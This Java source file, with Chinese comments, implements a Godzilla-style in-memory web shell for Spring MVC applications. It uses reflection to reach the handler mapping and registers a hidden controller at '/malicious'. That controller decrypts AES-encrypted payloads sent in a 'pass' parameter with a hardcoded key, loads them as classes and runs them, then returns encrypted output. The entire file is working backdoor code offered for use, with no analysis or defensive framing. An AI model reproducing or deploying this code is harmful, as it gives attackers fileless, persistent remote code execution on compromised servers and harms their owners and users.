import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.handler.AbstractHandlerMethodMapping;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.*;
import javax.crypto.*;
import javax.crypto.spec.*;
import javax.servlet.http.HttpSession;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.io.ByteArrayOutputStream;


public class GodzillaAddController extends ClassLoader {
    private final String injectUrlPath = "/malicious";

    private GodzillaAddController(String aaa){}

    public GodzillaAddController() throws ClassNotFoundException, IllegalAccessException, NoSuchMethodException, NoSuchFieldException, InvocationTargetException {

        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);

        // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
        AbstractHandlerMethodMapping abstractHandlerMethodMapping = context.getBean(AbstractHandlerMethodMapping.class);
        Method method = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping").getDeclaredMethod("getMappingRegistry");
        method.setAccessible(true);
        Object  mappingRegistry = (Object) method.invoke(abstractHandlerMethodMapping);

        Field field = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry").getDeclaredField("urlLookup");
        field.setAccessible(true);
        Map urlLookup = (Map) field.get(mappingRegistry);
        Iterator urlIterator = urlLookup.keySet().iterator();
        while (urlIterator.hasNext()){
            String urlPath = (String) urlIterator.next();
            if (this.injectUrlPath.equals(urlPath)){
                System.out.println("URL已存在");
                return;
            }
        }
        // 2. 通过反射获得自定义 controller 中唯一的 Method 对象
        Method method2 = GodzillaAddController.class.getMethod("test");
        // 3. 定义访问 controller 的 URL 地址
        PatternsRequestCondition url = new PatternsRequestCondition(this.injectUrlPath);
        // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
        // 5. 在内存中动态注册 controller
        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
        GodzillaAddController godzillaAddController = new GodzillaAddController("aaa");
        mappingHandlerMapping.registerMapping(info, godzillaAddController, method2);
    }

    // controller处理请求时执行的代码
    public void test() throws Exception {
        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
        HttpSession session = request.getSession();
        try {
            // Godzilla 逻辑
            System.out.println("GodzillaAddController Start ......");
            String Pwd = "pass";
            String xc = "3c6e0b8a9c15224a";
            String md5 = md5(Pwd + xc);
            byte[] data = base64Decode(request.getParameter(Pwd));
            data = x(data, false);
            if (session.getAttribute("payload") == null) {
                session.setAttribute("payload", (new GodzillaAddController(getClass().getClassLoader())).Q(data));
                System.out.println(session.getAttribute("payload"));
            } else {
                request.setAttribute("parameters", data);
                ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                Object f = ((Class) session.getAttribute("payload")).newInstance();
                f.equals(arrOut);
                f.equals(data);
                response.getWriter().write(md5.substring(0, 16));
                f.toString();
                response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));
                response.getWriter().write(md5.substring(16));
                response.getWriter().flush();
                response.getWriter().close();
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public GodzillaAddController(ClassLoader z) {
        super(z);
    }

    public Class Q(byte[] cb) {
        return defineClass(cb, 0, cb.length);
    }

    public byte[] x(byte[] s, boolean m) {
        String xc = "3c6e0b8a9c15224a";
        try {
            Cipher c = Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new SecretKeySpec(xc.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception e) {
            return null;
        }
    }

    public static String md5(String s) {
        String ret = null;
        try {
            MessageDigest m = MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = (new BigInteger(1, m.digest())).toString(16).toUpperCase();
        } catch (Exception exception) {}
        return ret;
    }

    public static String base64Encode(byte[] bs) throws Exception {
        String value = null;
        try {
            Class<?> base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
            value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });
        } catch (Exception e) {
            try {
                Class<?> base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });
            } catch (Exception exception) {}
        }
        return value;
    }

    public static byte[] base64Decode(String bs) throws Exception {
        byte[] value = null;
        try {
            Class<?> base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });
        } catch (Exception e) {
            try {
                Class<?> base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });
            } catch (Exception exception) {}
        }
        return value;
    }
}